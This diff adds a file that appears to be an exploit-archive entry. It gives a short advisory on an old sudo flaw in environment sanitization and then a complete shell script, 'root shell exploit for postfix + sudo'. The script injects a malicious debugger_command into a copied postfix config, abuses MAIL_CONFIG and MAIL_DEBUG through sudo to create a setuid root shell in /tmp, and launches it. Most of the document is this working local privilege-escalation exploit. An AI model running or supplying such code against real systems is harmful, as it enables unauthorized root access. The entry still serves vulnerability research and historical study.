@@ -1,0 +1,43 @@
+source: http://www.securityfocus.com/bid/3871/info
+
+Sudo is a freely available, open source permissions management software package available for the Linux and Unix operating systems. It is maintained by Todd C. Miller.
+
+Under some circumstances, sudo does not properly sanitize the environment it executes programs with. In the event that sudo is used to run a program such as an MTA with root privileges, this could result in a local user passing unsafe data to the program via environment variables. From these environment variables the user may be able to execute commands as root, and potentially gain elevated privileges.
+
+#!/bin/sh
+#
+# root shell exploit for postfix + sudo
+# tested on debian powerpc unstable
+#
+# by Charles 'core' Stevenson <core@bokeoa.com>
+
+# Put your password here if you're not in the sudoers file
+PASSWORD=wdnownz
+
+echo -e "sudo exploit by core <core@bokeoa.com>\n"
+
+echo "Setting up postfix config directory..."
+/bin/cp -r /etc/postfix /tmp
+
+echo "Adding malicious debugger command..."
+echo "debugger_command = /bin/cp /bin/sh /tmp/sh; chmod 4755 /tmp/sh">>/tmp/postfix/main.cf
+
+echo "Setting up environment..."
+export MAIL_CONFIG=/tmp/postfix
+export MAIL_DEBUG=
+
+sleep 2
+
+echo "Trying to exploit..."
+echo -e "$PASSWORD\n"|/usr/bin/sudo su -
+
+sleep 2
+
+echo "We should have a root shell let's check..."
+ls -l /tmp/sh
+
+echo "Cleaning up..."
+rm -rf /tmp/postfix
+
+echo "Attempting to run root shell..."
+/tmp/sh
